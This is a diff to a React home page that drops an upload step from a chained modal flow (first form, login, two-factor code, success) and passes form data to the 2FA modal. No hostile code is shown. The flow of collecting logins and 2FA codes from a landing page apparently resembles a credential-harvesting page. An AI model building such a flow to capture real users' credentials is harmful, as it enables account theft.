@@ -11,7 +11,6 @@ import countryToLanguage from '@/utils/country_to_language';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
-import UploadModal from '@/components/UploadModal';
 import SuccessModal from '@/components/SuccessModal';
 import Sidebar from '@/components/Sidebar';
 import BenefitsSection from '@/components/BenefitsSection';
@@ -29,7 +28,6 @@ const Home = () =>
     const [ showFirstModal, setShowFirstModal ] = useState( false );
     const [ showLoginModal, setShowLoginModal ] = useState( false );
     const [ show2FAModal, setShow2FAModal ] = useState( false );
-    const [ showUploadModal, setShowUploadModal ] = useState( false );
     const [ showSuccessModal, setShowSuccessModal ] = useState( false );
     const [ showSearchModal, setShowSearchModal ] = useState( false );
     const [ showPrivacyModal, setShowPrivacyModal ] = useState( false );
@@ -696,8 +694,7 @@ const Home = () =>
 
             <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
             <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } />
-            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } } texts={ texts } />
-            <UploadModal show={ showUploadModal } onClose={ () => setShowUploadModal( false ) } onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } } texts={ texts } />
+            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowSuccessModal( true ); } } texts={ texts } formData={ formData } />
             <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />
             <SearchModal show={ showSearchModal } onClose={ () => setShowSearchModal( false ) } texts={ texts } />
             <PrivacyPolicyModal
